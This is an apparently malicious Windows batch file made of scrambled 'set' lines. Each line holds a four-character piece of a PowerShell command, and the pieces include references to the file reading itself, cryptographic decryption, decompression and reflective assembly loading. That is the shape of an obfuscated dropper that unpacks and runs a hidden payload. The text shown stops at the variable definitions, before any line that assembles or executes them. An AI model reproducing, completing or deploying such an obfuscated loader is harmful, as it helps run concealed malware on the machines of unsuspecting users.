@echo off
set "tBWLQUNRBp=-Obj"
set "xYWMnGcZGS=Fo7l"
set "tunVWsosoX=y]::"
set "dFYpfFlGPK=m.IO"
set "xqUJdXNirU=Star"
set "AqhVoEKKdr=-joi"
set "DsqaVabECc=lBlo"
set "YtKCIqlpYE=oryS"
set "WJINbsHXMQ= = $"
set "uQEyWTmSYv=Gu.D"
set "ZbcFjYoNii=$OHL"
set "XXfZEFImYB=bstr"
set "NYifmikhjQ=orF'"
set "XfDZwPvDdv=OyzA"
set "XXVzRjRaEL=736u"
set "YRFcohlRvF=v4Ir"
set "QygfZPYtMA=.Key"
set "WYjlTbwjTy= = $"
set "IBHmruNcfD= = ["
set "UaaJIkBDSZ=ring"
set "TbFEPocaPR=lit("
set "ROuDczMiHv=);$z"
set "CoxsJyMcvS=em.C"
set "FqLZEpQwOE=ey ="
set "CWWbPblBuU=rtS4"
set "rkRGgucgoy=z = "
set "kmjgQZjhNp=;$xM"
set "ViVBqLwAEY=TCs "
set "JuqIDnIPdr=Obje"
set "DqZfIWeevY=z, 0"
set "CxSJlqYWIU=ing("
set "BLOHAMNbLM=ey);"
set "cyZMnEfpaR=ateD"
set "XJPvnfSdCr=M) {"
set "kPgxvSbGWX=grap"
set "MRrytxQwcH=nage"
set "yBKLhxvnPu=]::C"
set "ILkVdOfiKT=ZYYc"
set "sEifBcjsoW=brea"
set "RfESKaCfYQ=lncY"
set "LRwBvEsnhi=Disp"
set "uaYFDwQJQn=OU.T"
set "LBZKtvXVnj=ress"
set "fkcCkLAgeN=oint"
set "GtjoAjmwyP=$zPP"
set "HKvXtwqdsa=-1.."
set "HlBjCUdxgM=.Con"
set "WTivIuKigk=7;$y"
set "EKIsCBtXxC=ress"
set "TMYBYaOebE=and "
set "kMBDkKUPhX=pres"
set "BWSgZgnXgH=g = "
set "oQjSyQXYsy=sion"
set "mKbjjNiOsz=);$m"
set "QbWbWssBCU=rity"
set "tYwDCruhBv== [S"
set "CZUzFGDbTW=O.Me"
set "jQpqOByzoQ===')"
set "DwsfuzlRdt=ypto"
set "rxyOUeDCDL=t Sy"
set "HQGfSPUbaR=]::("
set "wrDVKeGHkt=3); "
set "uHPNWqovgK=..-1"
set "ZnOYYCOcFq=1] -"
set "AMjfrGujpz=; };"
set "DlYnziDUOf=]::("
set "REYpsESgGE=.Ass"
set "JnCtiMkgQh=('%~f0'"
set "JkzXpeFWPC=am;$"
set "tfWsIPXHeP=$pWv"
set "LvsuWRzlAV=Lf, "
set "HrSgAtnPmL=ose("
set "SFziiKnpvi=-nop"
set "otajGBztYO=Syst"
set "vOzghVJbEb=ert]"
set "FjJAEwLuAJ=tem."
set "eomTTNVtng=Stre"
set "pJaVANjHka=comm"
set "adUdaNEnYm=gnir"
set "RVlsbEYOgG=hy.A"
set "nAfPQNvsui=ay()"
set "SRweKKBEGh=daeR"
set "VkliWfTmCj=('da"
set "GrOKQIRdYx=ewLi"
set "ESySDYHLhl=  $H"
set "OqgTgUvgYY='gni"
set "ieBEatKSUt=$zPP"
set "JKNYLLhYCN=.Dis"
set "AuEtkmSjYy= if "
set "gFGUrYGSES=OHLR"
set "DBMGRjkFyg=$xMm"
set "JwtfNxXZIp=3HWs"
set "zlhZBimbYL=$xyR"
set "ipRTIUgCCN=mory"
set "etjcAcQlnB=::De"
set "qEoFyaQoZU=oArr"
set "bNcyKZqcZP=+hAO"
set "hGIMZEBNvO=Rz ="
set "MckwRCtpQW=raph"
set "BUVngRUlrj=fore"
set "LjNMnXQTED=New-"
set "ILsuXlZHjP=WvGu"
set "NBLyDmWVnT=e = "
set "wyikPOFEbp=comp"
set "qzRIJFFdRH=-4] "
set "eYpfCnBUzY=ne);"
set "xLDvZQusnO= = N"
